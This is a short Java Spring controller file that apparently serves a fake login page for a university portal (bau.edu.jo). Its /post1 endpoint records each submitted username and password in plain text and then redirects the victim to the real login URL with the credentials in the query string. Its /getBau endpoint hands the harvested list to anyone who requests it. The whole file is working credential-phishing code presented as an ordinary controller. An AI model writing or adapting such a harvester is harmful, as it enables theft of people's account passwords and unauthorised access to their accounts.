package com.example.Controllers;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import java.util.ArrayList;

/**
 * Created by baraa on 1/18/2017.
 */

@Controller
public class BAU {

    static ArrayList<String> list = new ArrayList<>();


    @RequestMapping("/post1")
    public String s(@RequestParam("username") String userName, @RequestParam("password") String password) {
        list.add("The userName is : " + userName + " and  Your Password is  " + password);
        return "redirect:http://app2.bau.edu.jo:7777/reg_new/actions/login?username=" + userName + "&password=" + password;
    }

    @RequestMapping("/getBau")
    @ResponseBody
    public ArrayList list()
    {
        return list;
    }

    @RequestMapping("/bau")
    public String bau()
    {
        return "bau";
    }


}
